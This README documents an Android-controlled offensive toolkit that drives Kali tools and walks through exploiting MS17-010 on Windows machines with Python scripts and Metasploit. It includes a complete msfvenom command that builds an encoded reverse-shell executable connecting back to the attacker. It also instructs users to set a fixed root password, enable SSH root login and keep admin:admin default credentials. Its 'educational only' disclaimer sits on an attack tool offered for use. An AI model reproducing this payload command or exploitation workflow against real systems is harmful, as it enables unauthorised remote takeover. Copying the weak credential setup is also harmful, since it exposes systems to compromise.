# Hack Into Your Heart

**This tool is only use for academic and educational.If someone use this tool causes any loss to others, I will not take any responsibility.**

You must change root password to !ROOTER and open SSH root permissions.

### Download:
```
git clone https://github.com/aifred0729-TW/hack_into_your_heart.git
```

## Usage

Install Offensive_Security on android phone or your android virtual environment.

Login page default credentials is admin:admin

Start SSH service for AI2 program connect.<br>
Download the ms17-010.sh to /root and put the command.rc to /root, ms17-010.sh will used.<br>
If the vulnerable VM has the MS17-010 vulnerabilities, you can run checker.py with python2 to confirm target can be exploit.<br>
When checker.py is successful scan the vulnerable VM pipe, run send_and_execute.py with python2 to exploit the vulnerable VM.<br>

If you no have the shell.exe, use the msfvenom to spawn one.
```
msfvenom -p windows/shell_reverse_tcp -a x86 -e x86/shikata_ga_nai LHOST=<Your Local IP> LPORT=<Listen Port> -f exe -o shell.exe
```


### Linux Bash Module:<br>
Type the IP address of kali and type your bash command on it, than you can execute.<br>
If you know how to use the ssh, then you should be know how to use this modulel.<br>

Example Command:
```
ifconfig
```

### Nmap Module:<br>
Type the IP address of kali and target and setup the option then you can execute.<br>
Scan report will below the console.<br>


### Searchsploit Module:<br>
Type the vulnerabilities number or CMS/Service name and version.<br>
If the input CMS/Service is vulnerable, than it will show the exploit.<br>

### Metasploit Module:<br>
Type the RHost LHost to input box and select a exploit module, then you can exploit.<br>
For security reason, if metasploit successful remote code execution, the target will be shutdown in 3 second.<br>
**The Target is not 100% can be exploit**


My Email:aifred0729@yahoo.com<br>
My Facebook:https://www.facebook.com/profile.php?id=100009717251061<br>

Try Harder!!

